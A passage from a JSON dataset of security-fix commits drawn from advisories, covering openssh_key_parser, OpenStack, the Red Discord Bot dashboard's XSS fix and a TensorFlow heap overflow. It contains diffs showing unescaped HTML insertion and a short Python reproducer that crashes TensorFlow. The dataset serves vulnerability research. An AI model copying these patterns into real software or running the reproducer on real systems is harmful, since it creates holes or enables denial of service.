initlist,'}}","message_norm":"improved error handling to prevent unhandled exceptions in calling code.","language":"en","entities":"[('improved', 'ACTION', ''), ('error handling', 'SECWORD', ''), ('prevent', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['openssh_key\/private_key_list.py'])","num_files":1.0},{"index":2090,"vuln_id":"GHSA-hm37-9xh2-q499","cwe_id":"{'CWE-209'}","score":7.7,"chain":"{'https:\/\/github.com\/scottcwang\/openssh_key_parser\/commit\/d5b53b4b7e76c5b666fc657019dbf864fb04076c', 'https:\/\/github.com\/scottcwang\/openssh_key_parser\/commit\/26e0a471e9fdb23e635bc3014cf4cbd2323a08d3', 'https:\/\/github.com\/scottcwang\/openssh_key_parser\/commit\/274447f91b4037b7050ae634879b657554523b39'}","dataset":"osv","summary":"Possible leak of key's raw field if declared length is incorrect ### Impact\nIf a field of a key is shorter than it is declared to be, the parser raises an error with a message containing the raw field value. An attacker able to modify the declared length of a key's sensitive field can thus expose the raw value of that field.\n\n### Patches\nUpgrade to version 0.0.6, which no longer includes the raw field value in the error message.\n\n### Workarounds\nN\/A\n\n### References\nN\/A\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [openssh_key_parser](https:\/\/github.com\/scottcwang\/openssh_key_parser)","published_date":"2022-07-06","chain_len":3,"project":"https:\/\/github.com\/scottcwang\/openssh_key_parser","commit_href":"https:\/\/github.com\/scottcwang\/openssh_key_parser\/commit\/26e0a471e9fdb23e635bc3014cf4cbd2323a08d3","commit_sha":"26e0a471e9fdb23e635bc3014cf4cbd2323a08d3","patch":"MULTI","chain_ord":"['26e0a471e9fdb23e635bc3014cf4cbd2323a08d3', 'd5b53b4b7e76c5b666fc657019dbf864fb04076c', '274447f91b4037b7050ae634879b657554523b39']","before_first_fix_commit":"{'ae4d131d1cd8fe06325bfd6b749305aca60873bf', '69fe5b7addc21d3f39626ae93c6961811aea9d4c'}","last_fix_commit":"274447f91b4037b7050ae634879b657554523b39","chain_ord_pos":1.0,"commit_datetime":"06\/22\/2022, 14:49:37","message":"Changed an exception message to prevent possible disclosures of keying material.","author":"Michael Doyle","comments":null,"stats":"{'additions': 2, 'deletions': 1, 'total': 3}","files":"{'openssh_key\/pascal_style_byte_stream.py': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/scottcwang\/openssh_key_parser\/raw\/26e0a471e9fdb23e635bc3014cf4cbd2323a08d3\/openssh_key%2Fpascal_style_byte_stream.py', 'patch': '@@ -236,7 +236,8 @@ def read_fixed_bytes(self, num_bytes: int) -> bytes:\\n         \"\"\"\\n         read_bytes = self.read(num_bytes)\\n         if len(read_bytes) < num_bytes:\\n-            raise EOFError(read_bytes)\\n+            raise EOFError(\"Fewer than \\'num_bytes\\' bytes remaining in the \"\\n+                    \"underlying bytestream\")\\n         return read_bytes\\n \\n     def read_pascal_bytes(self, string_length_size: int) -> bytes:'}}","message_norm":"changed an exception message to prevent possible disclosures of keying material.","language":"en","entities":"[('changed', 'ACTION', ''), ('prevent', 'ACTION', ''), ('keying', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['openssh_key\/pascal_style_byte_stream.py'])","num_files":1.0},{"index":2093,"vuln_id":"GHSA-hm3x-jwwf-jpr9","cwe_id":"{'CWE-200', 'CWE-668'}","score":4.3,"chain":"{'https:\/\/github.com\/openstack\/tripleo-heat-templates\/commit\/160936df134a471cfd245bd60964046027a571ea', 'https:\/\/github.com\/openstack\/tripleo-heat-templates\/commit\/2b9461e97fc5c4ceb0848d1cc4484f656bb85515'}","dataset":"osv","summary":"Exposure of Sensitive Information to an Unauthorized Actor in OpenStack tripleo-heat-templates An information exposure flaw in openstack-tripleo-heat-templates allows an external user to discover the internal IP or hostname. An attacker could exploit this by checking the `www_authenticate_uri parameter` (which is visible to all end users) in configuration files. This would give sensitive information which may aid in additional system exploitation. A patch is available on the `master` branch and anticipated to be part of version 11.6.1.","published_date":"2022-03-24","chain_len":2,"project":"https:\/\/github.com\/openstack\/tripleo-heat-templates","commit_href":"https:\/\/github.com\/openstack\/tripleo-heat-templates\/commit\/2b9461e97fc5c4ceb0848d1cc4484f656bb85515","commit_sha":"2b9461e97fc5c4ceb0848d1cc4484f656bb85515","patch":"MULTI","chain_ord":"['160936df134a471cfd245bd60964046027a571ea', '2b9461e97fc5c4ceb0848d1cc4484f656bb85515']","before_first_fix_commit":"{'ea4d002dde779e84c25c983aa3534cf62fe9386f'}","last_fix_commit":"2b9461e97fc5c4ceb0848d1cc4484f656bb85515","chain_ord_pos":2.0,"commit_datetime":"01\/06\/2022, 01:32:48","message":"Fix remaining usage of internal url for www_authenticate_uri\n\nThis is follow-up of 160936df134a471cfd245bd60964046027a571ea and fixes\nremaining usage of internal endpoint url for [keystone_authtoken]\nwww_authenticate_uri.\n\nRelated-Bug: #1955397\nChange-Id: Ib2ee7295c7fcda276e4fcf011a9e427e041f4848","author":"Takashi Kajinami","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'deployment\/ironic\/ironic-api-container-puppet.yaml': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/openstack\/tripleo-heat-templates\/raw\/2b9461e97fc5c4ceb0848d1cc4484f656bb85515\/deployment%2Fironic%2Fironic-api-container-puppet.yaml', 'patch': \"@@ -163,7 +163,7 @@ outputs:\\n             ironic::api::authtoken::user_domain_name: 'Default'\\n             ironic::api::authtoken::project_domain_name: 'Default'\\n             ironic::api::authtoken::username: 'ironic'\\n-            ironic::api::authtoken::www_authenticate_uri: {get_param: [EndpointMap, KeystoneInternal, uri_no_suffix]}\\n+            ironic::api::authtoken::www_authenticate_uri: {get_param: [EndpointMap, KeystonePublic, uri_no_suffix]}\\n             ironic::api::authtoken::auth_url: {get_param: [EndpointMap, KeystoneInternal, uri_no_suffix]}\\n             ironic::api::authtoken::region_name: {get_param: KeystoneRegion}\\n             ironic::api::authtoken::interface: 'internal'\"}}","message_norm":"fix remaining usage of internal url for www_authenticate_uri\n\nthis is follow-up of 160936df134a471cfd245bd60964046027a571ea and fixes\nremaining usage of internal endpoint url for [keystone_authtoken]\nwww_authenticate_uri.\n\nrelated-bug: #1955397\nchange-id: ib2ee7295c7fcda276e4fcf011a9e427e041f4848","language":"en","entities":"[('fix', 'ACTION', ''), ('160936df134a471cfd245bd60964046027a571ea', 'SHA', 'generic_sha'), ('fixes', 'ACTION', ''), ('keystone_authtoken', 'SECWORD', ''), ('bug', 'FLAW', ''), ('#1955397', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['deployment\/ironic\/ironic-api-container-puppet.yaml'])","num_files":1.0},{"index":2094,"vuln_id":"GHSA-hm45-mgqm-gjm4","cwe_id":"{'CWE-79'}","score":7.7,"chain":"{'https:\/\/github.com\/Cog-Creators\/Red-Dashboard\/commit\/a6b9785338003ec87fb75305e7d1cc2d40c7ab91', 'https:\/\/github.com\/Cog-Creators\/Red-Dashboard\/commit\/99d88b840674674166ce005b784ae8e31e955ab1'}","dataset":"osv","summary":"Remote Code Execution (RCE) Exploit on Cross Site Scripting (XSS) Vulnerability ### Impact\nA RCE exploit has been discovered in the Red Discord Bot - Dashboard Webserver: this exploit allows Discord users with specially crafted Server names and Usernames\/Nicknames to inject code into the webserver front-end code.  By abusing this exploit, it's possible to perform destructive actions and\/or access sensitive information.\n\n### Patches\nThis high severity exploit has been fixed on version `0.1.7a`.\n\n### Workarounds\nThere are no workarounds, bot owners must upgrade their relevant packages (Dashboard module and Dashboard webserver) in order to patch this issue\n\n### References\n- 99d88b8\n- a6b9785\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Cog-Creators\/Red-Dashboard](https:\/\/github.com\/Cog-Creators\/Red-Dashboard\/issues\/new\/choose)\n* Over on the official [Red Server](https:\/\/discord.gg\/red) or at the Third Party Server [Toxic Layer](https:\/\/discord.gg\/vQZTdB9)","published_date":"2020-12-08","chain_len":2,"project":"https:\/\/github.com\/Cog-Creators\/Red-Dashboard","commit_href":"https:\/\/github.com\/Cog-Creators\/Red-Dashboard\/commit\/a6b9785338003ec87fb75305e7d1cc2d40c7ab91","commit_sha":"a6b9785338003ec87fb75305e7d1cc2d40c7ab91","patch":"MULTI","chain_ord":"['99d88b840674674166ce005b784ae8e31e955ab1', 'a6b9785338003ec87fb75305e7d1cc2d40c7ab91']","before_first_fix_commit":"{'261f00f52bbfee4db67f624fd7409bf08124a6c4'}","last_fix_commit":"a6b9785338003ec87fb75305e7d1cc2d40c7ab91","chain_ord_pos":2.0,"commit_datetime":"12\/01\/2020, 14:15:49","message":"[UI] Fix SelectPicker not rendering properly","author":"NeuroAssassin","comments":null,"stats":"{'additions': 41, 'deletions': 16, 'total': 57}","files":"{'reddash\/app\/home\/templates\/guild.html': {'additions': 41, 'deletions': 16, 'changes': 57, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Cog-Creators\/Red-Dashboard\/raw\/a6b9785338003ec87fb75305e7d1cc2d40c7ab91\/reddash%2Fapp%2Fhome%2Ftemplates%2Fguild.html', 'patch': '@@ -930,20 +930,20 @@ <h5>{{ data[\\'message\\'] }}<\/h5>\\n             img.attr(\"src\", `${img.attr(\"data-src-url\")}png`)\\r\\n         }\\r\\n     }\\r\\n+\\r\\n+    function safe(str) {\\r\\n+        return String(str).replace(\/&\/g, \\'&amp;\\').replace(\/<\/g, \\'&lt;\\').replace(\/>\/g, \\'&gt;\\').replace(\/\"\/g, \\'&quot;\\');\\r\\n+    }\\r\\n <\/script>\\r\\n \\r\\n {% if data[\\'status\\'] == 1 and data[\\'data\\'][\\'status\\'] == 1 %}\\r\\n \\r\\n-{% if \\'aliascc\\' in data[\\'data\\'][\\'permslist\\'] %}\\r\\n+{% if \\'aliascc\\' in data[\\'data\\'][\\'permslist\\'] and false%}\\r\\n <script>\\r\\n     \/* ---------------------------------------------------------------------------------------------------------------------\\r\\n                                                         Aliases group\\r\\n        --------------------------------------------------------------------------------------------------------------------- *\/\\r\\n \\r\\n-    function safe(str) {\\r\\n-        return String(str).replace(\/&\/g, \\'&amp;\\').replace(\/<\/g, \\'&lt;\\').replace(\/>\/g, \\'&gt;\\').replace(\/\"\/g, \\'&quot;\\');\\r\\n-    }\\r\\n-\\r\\n     \/\/ Alias modal\\r\\n     $(document).on(\\'click\\', \\'.editaliasbutton\\', function () {\\r\\n         var command = $(this).parent().parent().data(\"command\")\\r\\n@@ -1186,28 +1186,35 @@ <h5>{{ data[\\'message\\'] }}<\/h5>\\n             } else if (json.status === 1 && json.data.status === 0) {\\r\\n                 $(\"#targetstatus\").html(`{{ _(\\'Failed to fetch targets\\') }}: ${json.data.message}`)\\r\\n             } else {\\r\\n+                let big_ol_dict = {}\\r\\n                 select.html(\"\")\\r\\n \\r\\n                 var chopt = [`<optgroup label=\"{{ _(\\'Channels\\') }}\">`]\\r\\n                 for (let [id, name] of json.data.CHANNELS) {\\r\\n-                    chopt.push(`<option value=${id}>${name}<\/option>`)\\r\\n+                    chopt.push(`<option value=${id} class=\"selectpicker-element-${id}\">Loading...<\/option>`)\\r\\n+                    big_ol_dict[id] = name\\r\\n                 }\\r\\n                 chopt.push(\"<\/optgroup>\")\\r\\n                 select.append(chopt.join(\"\"))\\r\\n \\r\\n                 var ropt = [`<optgroup label=\"{{ _(\\'Roles\\') }}\">`]\\r\\n                 for (let [id, name] of json.data.ROLES) {\\r\\n-                    ropt.push(`<option value=${id}>${name}<\/option>`)\\r\\n+                    ropt.push(`<option value=${id} class=\"selectpicker-element-${id}\">Loading...<\/option>`)\\r\\n+                    big_ol_dict[id] = name\\r\\n                 }\\r\\n                 ropt.push(\"<\/optgroup>\")\\r\\n                 select.append(ropt.join(\"\"))\\r\\n \\r\\n                 var uopt = [`<optgroup label=\"{{ _(\\'Users\\') }}\">`]\\r\\n                 for (let [id, name] of json.data.USERS) {\\r\\n-                    uopt.push(`<option value=${id}>${name}<\/option>`)\\r\\n+                    uopt.push(`<option value=${id} class=\"selectpicker-element-${id}\">Loading...<\/option>`)\\r\\n+                    big_ol_dict[id] = name\\r\\n                 }\\r\\n                 uopt.push(\"<\/optgroup>\")\\r\\n                 select.append(uopt.join(\"\"))\\r\\n+                for (let [id, name] of Object.entries(big_ol_dict)) {\\r\\n+                    $(`.selectpicker-element-${id}`).text(name)\\r\\n+                }\\r\\n             }\\r\\n             select.selectpicker({ title: \"{{ _(\\'Choose target\\') }}\" })\\r\\n             select.removeAttr(\"disabled\")\\r\\n@@ -1299,18 +1306,24 @@ <h5>{{ data[\\'message\\'] }}<\/h5>\\n                 $(\"#rulesdiv\").html(\"\")\\r\\n                 var overall = [\\'<h3 style=\"margin-bottom: 10px\">{{ _(\"Cog rules\") }}<\/h3>\\']\\r\\n                 var allcoglines = [\"<ul>\"]\\r\\n+\\r\\n+                let big_ol_dict_two = {}\\r\\n+                let cog_counter = 0\\r\\n+\\r\\n                 for (let [cog, rules] of Object.entries(json.data.COG)) {\\r\\n                     var coglines = []\\r\\n                     for (let rule of rules) {\\r\\n                         if (rule.type === \"Default\") {\\r\\n                             coglines.unshift(`<li>{{ _(\\'By default, users are\\') }} ${rule.permission} {{ _(\\'permission to use the\\') }} <code>${cog}<\/code> {{ _(\\'cog\\') }}.<\/li>`)\\r\\n                         } else if (rule.type === \"Role\") {\\r\\n-                            coglines.push(`<li>{{ _(\\'Users with the\\') }} <code>${rule.name}<\/code> {{ _(\\'role\\') }} (${rule.id}) {{ _(\\'are\\') }} ${rule.permission} {{ _(\\'permission to use the\\') }} <code>${cog}<\/code> {{ _(\\'cog\\') }}.<\/li>`)\\r\\n+                            coglines.push(`<li>{{ _(\\'Users with the\\') }} <code id=\"cog-rules-${cog_counter}\">Loading...<\/code> {{ _(\\'role\\') }} (${rule.id}) {{ _(\\'are\\') }} ${rule.permission} {{ _(\\'permission to use the\\') }} <code>${cog}<\/code> {{ _(\\'cog\\') }}.<\/li>`)\\r\\n                         } else if (rule.type === \"Channel\") {\\r\\n-                            coglines.push(`<li>{{ _(\\'Users in the\\') }} <code>${rule.name}<\/code> {{ _(\\'channel\\') }} (${rule.id}) {{ _(\\'are\\') }} ${rule.permission} {{ _(\\'permission to use the\\') }} <code>${cog}<\/code> {{ _(\\'cog\\') }}.<\/li>`)\\r\\n+                            coglines.push(`<li>{{ _(\\'Users in the\\') }} <code id=\"cog-rules-${cog_counter}\">Loading...<\/code> {{ _(\\'channel\\') }} (${rule.id}) {{ _(\\'are\\') }} ${rule.permission} {{ _(\\'permission to use the\\') }} <code>${cog}<\/code> {{ _(\\'cog\\') }}.<\/li>`)\\r\\n                         } else {\\r\\n-                            coglines.push(`<li>{{ _(\\'User\\') }} <code>${rule.name}<\/code> (${rule.id}) {{ _(\\'is\\') }} ${rule.permission} {{ _(\\'permission to use the\\') }} <code>${cog}<\/code> {{ _(\\'cog\\') }}.<\/li>`)\\r\\n+                            coglines.push(`<li>{{ _(\\'User\\') }} <code id=\"cog-rules-${cog_counter}\">Loading...<\/code> (${rule.id}) {{ _(\\'is\\') }} ${rule.permission} {{ _(\\'permission to use the\\') }} <code>${cog}<\/code> {{ _(\\'cog\\') }}.<\/li>`)\\r\\n                         }\\r\\n+                        big_ol_dict_two[`cog-rules-${cog_counter}`] = rule.name\\r\\n+                        cog_counter += 1\\r\\n                     }\\r\\n                     if (coglines) {\\r\\n                         allcoglines = allcoglines.concat(coglines)\\r\\n@@ -1324,18 +1337,23 @@ <h5>{{ data[\\'message\\'] }}<\/h5>\\n \\r\\n                 overall.push(\\'<h3 style=\"margin-bottom: 10px\">{{ _(\"Command rules\") }}<\/h3>\\')\\r\\n                 var allcmdlines = [\"<ul>\"]\\r\\n+\\r\\n+                let cmd_counter = 0\\r\\n+\\r\\n                 for (let [cmd, rules] of Object.entries(json.data.COMMAND)) {\\r\\n                     var cmdlines = []\\r\\n                     for (let rule of rules) {\\r\\n                         if (rule.type === \"Default\") {\\r\\n                             cmdlines.unshift(`<li>{{ _(\\'By default, users are\\') }} ${rule.permission} {{ _(\\'permission to use the\\') }} <code>${cmd}<\/code> {{ _(\\'command\\') }}.<\/li>`)\\r\\n                         } else if (rule.type === \"Role\") {\\r\\n-                            cmdlines.push(`<li>{{ _(\\'Users with the\\') }} <code>${rule.name}<\/code> {{ _(\\'role\\') }} (${rule.id}) {{ _(\\'are\\') }} ${rule.permission} {{ _(\\'permission to use the\\') }} <code>${cmd}<\/code> {{ _(\\'command\\') }}.<\/li>`)\\r\\n+                            cmdlines.push(`<li>{{ _(\\'Users with the\\') }} <code id=\"cmd-rules-${cmd_counter}\">Loading...<\/code> {{ _(\\'role\\') }} (${rule.id}) {{ _(\\'are\\') }} ${rule.permission} {{ _(\\'permission to use the\\') }} <code>${cmd}<\/code> {{ _(\\'command\\') }}.<\/li>`)\\r\\n                         } else if (rule.type === \"Channel\") {\\r\\n-                            cmdlines.push(`<li>{{ _(\\'Users in the\\') }} <code>${rule.name}<\/code> {{ _(\\'channel\\') }} (${rule.id}) {{ _(\\'are\\') }} ${rule.permission} {{ _(\\'permission to use the\\') }} <code>${cmd}<\/code> {{ _(\\'command\\') }}.<\/li>`)\\r\\n+                            cmdlines.push(`<li>{{ _(\\'Users in the\\') }} <code id=\"cmd-rules-${cmd_counter}\">Loading...<\/code> {{ _(\\'channel\\') }} (${rule.id}) {{ _(\\'are\\') }} ${rule.permission} {{ _(\\'permission to use the\\') }} <code>${cmd}<\/code> {{ _(\\'command\\') }}.<\/li>`)\\r\\n                         } else {\\r\\n-                            cmdlines.push(`<li>{{ _(\\'User\\') }} <code>${rule.name}<\/code> (${rule.id}) {{ _(\\'is\\') }} ${rule.permission} {{ _(\\'permission to use the\\') }} <code>${cmd}<\/code> {{ _(\\'command\\') }}.<\/li>`)\\r\\n+                            cmdlines.push(`<li>{{ _(\\'User\\') }} <code id=\"cmd-rules-${cmd_counter}\">Loading...<\/code> (${rule.id}) {{ _(\\'is\\') }} ${rule.permission} {{ _(\\'permission to use the\\') }} <code>${cmd}<\/code> {{ _(\\'command\\') }}.<\/li>`)\\r\\n                         }\\r\\n+                        big_ol_dict_two[`cmd-rules-${cmd_counter}`] = rule.name\\r\\n+                        cmd_counter += 1\\r\\n                     }\\r\\n                     if (cmdlines) {\\r\\n                         allcmdlines = allcmdlines.concat(cmdlines)\\r\\n@@ -1347,6 +1365,9 @@ <h5>{{ data[\\'message\\'] }}<\/h5>\\n                 }\\r\\n                 overall = overall.concat(allcmdlines)\\r\\n                 $(\"#rulesdiv\").html(overall.join(\"\"))\\r\\n+                for (let [id, name] of Object.entries(big_ol_dict_two)) {\\r\\n+                    $(`#${id}`).text(name)\\r\\n+                }\\r\\n                 $(\"#fetchrulesstatus\").html(\"{{ _(\\'Refreshed rules\\') }}.\")\\r\\n             }\\r\\n         }\\r\\n@@ -1378,18 +1399,20 @@ <h5>{{ data[\\'message\\'] }}<\/h5>\\n \\r\\n     $(document).on(\\'click\\', \\'.adminroleoption\\', function () {\\r\\n         var elm = $(this)\\r\\n+        let random_number = Math.floor(Math.random() * Math.floor(100000))\\r\\n         $(\"#adminrolelist\").append(`\\r\\n                 <li>\\r\\n                     <div class=\"row\">\\r\\n                         <div class=\"col-md-10 col-8\">\\r\\n-                            <input class=\"form-control adminroleinput\" value=\"${elm.text()}\" disabled=True data-id=\"${elm.attr(\"data-id\")}\">\\r\\n+                            <input class=\"form-control adminroleinput\" value=\"Loading...\" disabled=True data-id=\"${elm.attr(\"data-id\")}\" id=\"admin-role-${random_number}\">\\r\\n                         <\/div>\\r\\n                         <div class=\"col-md-1 col-1\">\\r\\n                             <span class=\"admin-role-x clickable\"><i class=\"tim-icons icon-simple-remove\" style=\"float: right; margin-top: 10px;\"><\/i><\/span>\\r\\n                         <\/div>\\r\\n                     <\/div>\\r\\n                 <\/li>\\r\\n             `)\\r\\n+        $(`#admin-role-${random_number}`).val(elm.text())\\r\\n         elm.remove()\\r\\n     })\\r\\n \\r\\n@@ -1442,18 +1465,20 @@ <h5>{{ data[\\'message\\'] }}<\/h5>\\n \\r\\n     $(document).on(\\'click\\', \\'.modroleoption\\', function () {\\r\\n         var elm = $(this)\\r\\n+        let random_number = Math.floor(Math.random() * Math.floor(100000))\\r\\n         $(\"#modrolelist\").append(`\\r\\n                 <li>\\r\\n                     <div class=\"row\">\\r\\n                         <div class=\"col-md-10 col-8\">\\r\\n-                            <input class=\"form-control modroleinput\" value=\"${elm.text()}\" disabled=True data-id=\"${elm.attr(\"data-id\")}\">\\r\\n+                            <input class=\"form-control modroleinput\" value=\"Loading...\" disabled=True data-id=\"${elm.attr(\"data-id\")}\" id=\"mod-role-${random_number}\">\\r\\n                         <\/div>\\r\\n                         <div class=\"col-md-1 col-1\">\\r\\n                             <span class=\"mod-role-x clickable\"><i class=\"tim-icons icon-simple-remove\" style=\"float: right; margin-top: 10px;\"><\/i><\/span>\\r\\n                         <\/div>\\r\\n                     <\/div>\\r\\n                 <\/li>\\r\\n             `)\\r\\n+        $(`#mod-role-${random_number}`).val(elm.text())\\r\\n         elm.remove()\\r\\n     })'}}","message_norm":"[ui] fix selectpicker not rendering properly","language":"en","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['reddash\/app\/home\/templates\/guild.html'])","num_files":1.0},{"index":2095,"vuln_id":"GHSA-hm45-mgqm-gjm4","cwe_id":"{'CWE-79'}","score":7.7,"chain":"{'https:\/\/github.com\/Cog-Creators\/Red-Dashboard\/commit\/a6b9785338003ec87fb75305e7d1cc2d40c7ab91', 'https:\/\/github.com\/Cog-Creators\/Red-Dashboard\/commit\/99d88b840674674166ce005b784ae8e31e955ab1'}","dataset":"osv","summary":"Remote Code Execution (RCE) Exploit on Cross Site Scripting (XSS) Vulnerability ### Impact\nA RCE exploit has been discovered in the Red Discord Bot - Dashboard Webserver: this exploit allows Discord users with specially crafted Server names and Usernames\/Nicknames to inject code into the webserver front-end code.  By abusing this exploit, it's possible to perform destructive actions and\/or access sensitive information.\n\n### Patches\nThis high severity exploit has been fixed on version `0.1.7a`.\n\n### Workarounds\nThere are no workarounds, bot owners must upgrade their relevant packages (Dashboard module and Dashboard webserver) in order to patch this issue\n\n### References\n- 99d88b8\n- a6b9785\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Cog-Creators\/Red-Dashboard](https:\/\/github.com\/Cog-Creators\/Red-Dashboard\/issues\/new\/choose)\n* Over on the official [Red Server](https:\/\/discord.gg\/red) or at the Third Party Server [Toxic Layer](https:\/\/discord.gg\/vQZTdB9)","published_date":"2020-12-08","chain_len":2,"project":"https:\/\/github.com\/Cog-Creators\/Red-Dashboard","commit_href":"https:\/\/github.com\/Cog-Creators\/Red-Dashboard\/commit\/99d88b840674674166ce005b784ae8e31e955ab1","commit_sha":"99d88b840674674166ce005b784ae8e31e955ab1","patch":"MULTI","chain_ord":"['99d88b840674674166ce005b784ae8e31e955ab1', 'a6b9785338003ec87fb75305e7d1cc2d40c7ab91']","before_first_fix_commit":"{'261f00f52bbfee4db67f624fd7409bf08124a6c4'}","last_fix_commit":"a6b9785338003ec87fb75305e7d1cc2d40c7ab91","chain_ord_pos":1.0,"commit_datetime":"11\/30\/2020, 11:49:18","message":"Fix unformatted HTML","author":"NeuroAssassin","comments":null,"stats":"{'additions': 6, 'deletions': 2, 'total': 8}","files":"{'reddash\/app\/home\/templates\/dashboard.html': {'additions': 6, 'deletions': 2, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Cog-Creators\/Red-Dashboard\/raw\/99d88b840674674166ce005b784ae8e31e955ab1\/reddash%2Fapp%2Fhome%2Ftemplates%2Fdashboard.html', 'patch': '@@ -72,6 +72,7 @@ <h1>{{ _(\\'Loading servers...\\') }}<\/h1>\\n                 } else {\\r\\n                     var base_guild_url = \"{{ url_for(\\'home_blueprint.guild\\', guild=\\'123456789123456789\\') }}\"\\r\\n                     $(\"#serverrow\").html(\"\")\\r\\n+                    let counter = 0\\r\\n                     for (let g of json.data) {\\r\\n                         var current_guild_url = base_guild_url.replace(\"123456789123456789\", g.id)\\r\\n                         $(\"#serverrow\").append(`\\r\\n@@ -80,13 +81,16 @@ <h1>{{ _(\\'Loading servers...\\') }}<\/h1>\\n                                     <div class=\"card h-100\" onmouseover=\"playGif(this)\" onmouseout=\"stopGif(this)\">\\r\\n                                         <img class=\"card-img-top\" src=\"${g.icon}png\" alt=\"Card image cap\" data-src-url=\"${g.icon}\" data-is-animated=${g.animated}>\\r\\n                                         <div class=\"card-body\">\\r\\n-                                            <h5 class=\"card-title\">${g.name}<\/h5>\\r\\n-                                            <p class=\"card-text\">Owner: ${g.owner}<\/p>\\r\\n+                                            <h5 class=\"card-title\" id=\"guild-counter-${counter}\">Loading...<\/h5>\\r\\n+                                            <p class=\"card-text\" id=\"owner-counter-${counter}\">Owner: Loading...<\/p>\\r\\n                                         <\/div>\\r\\n                                     <\/div>\\r\\n                                 <\/a>\\r\\n                             <\/div>\\r\\n                         `)\\r\\n+                        $(`#guild-counter-${counter}`).text(g.name)\\r\\n+                        $(`#owner-counter-${counter}`).text(g.owner)\\r\\n+                        counter += 1\\r\\n                     }\\r\\n                 }\\r\\n             }'}}","message_norm":"fix unformatted html","language":"en","entities":"[('fix', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['reddash\/app\/home\/templates\/dashboard.html'])","num_files":1.0},{"index":2096,"vuln_id":"GHSA-hmg3-c7xj-6qwm","cwe_id":"{'CWE-131'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1e922ccdf6bf46a3a52641f99fd47d54c1decd13'}","dataset":"osv","summary":"Heap buffer overflow in `SparseTensorToCSRSparseMatrix` ### Impact\nAn attacker can trigger a denial of service via a `CHECK`-fail in converting sparse tensors to CSR Sparse matrices:\n\n```python\nimport tensorflow as tf\nimport numpy as np\nfrom tensorflow.python.ops.linalg.sparse import sparse_csr_matrix_ops\n\nindices_array = np.array([[0, 0]])\nvalue_array = np.array([0.0], dtype=np.float32)\ndense_shape = [0, 0]\n\nst = tf.SparseTensor(indices_array, value_array, dense_shape)\n\nvalues_tensor = sparse_csr_matrix_ops.sparse_tensor_to_csr_sparse_matrix(\n       st.indices, st.values, st.dense_shape)\n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/800346f2c03a27e182dd4fba48295f65e7790739\/tensorflow\/core\/kernels\/sparse\/kernels.cc#L66) does a double redirection to access an element of an array allocated on the heap:\n\n```cc\ncsr_row_ptr(indices(i, 0) + 1) += 1;\n```\n                      \nIf the value at `indices(i, 0)` is such that `indices(i, 0) + 1` is outside the bounds of `csr_row_ptr`, this results in writing outside of bounds of heap allocated data.\n\n### Patches\nWe have patched the issue in GitHub commit [1e922ccdf6bf46a3a52641f99fd47d54c1decd13](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1e922ccdf6bf46a3a52641f99fd47d54c1decd13).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1e922ccdf6bf46a3a52641f99fd47d54c1decd13","commit_sha":"1e922ccdf6bf46a3a52641f99fd47d54c1decd13","patch":"SINGLE","chain_ord":"['1e922ccdf6bf46a3a52641f99fd47d54c1decd13']","before_first_fix_commit":"{'800346f2c03a27e182dd4fba48295f65e7790739'}","last_fix_commit":"1e922ccdf6bf46a3a52641f99fd47d54c1decd13","chain_ord_pos":1.0,"commit_datetime":"04\/23\/2021, 17:41:12","message":"Fix crash in `SparseTensorToCSRSparseMatrixCPUFunctor`\n\nPiperOrigin-RevId: 370110290\nChange-Id: I4451e92661a55c2180f80d38b67a9b50bf5edec5","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 6, 'deletions': 0, 'total': 6}","files":"{'tensorflow\/core\/kernels\/sparse\/kernels.cc': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/1e922ccdf6bf46a3a52641f99fd47d54c1decd13\/tensorflow%2Fcore%2Fkernels%2Fsparse%2Fkernels.cc', 'patch': '@@ -22,6 +22,7 @@ limitations under the License.\\n #include \"tensorflow\/core\/framework\/tensor_types.h\"\\n #include \"tensorflow\/core\/lib\/core\/errors.h\"\\n #include \"tensorflow\/core\/lib\/core\/status.h\"\\n+#include \"tensorflow\/core\/platform\/errors.h\"\\n \\n namespace tensorflow {\\n namespace functor {\\n@@ -63,6 +64,11 @@ Status SparseTensorToCSRSparseMatrixCPUFunctor::operator()(\\n \\n     for (int64 i = 0; i < total_nnz; ++i) {\\n       \/\/ For now, the rows pointers store the corresponding row counts.\\n+      int64 ix = indices(i, 0) + 1;\\n+      if (ix >= csr_row_ptr.size()) {\\n+        return errors::InvalidArgument(\"Got an index \", ix,\\n+                                       \" that is outside of csr_row_ptr\");\\n+      }\\n       csr_row_ptr(indices(i, 0) + 1) += 1;\\n       csr_col_ind(i) = indices(i, 1);\\n     }'}}","message_norm":"fix crash in `sparsetensortocsrsparsematrixcpufunctor`\n\npiperorigin-revid: 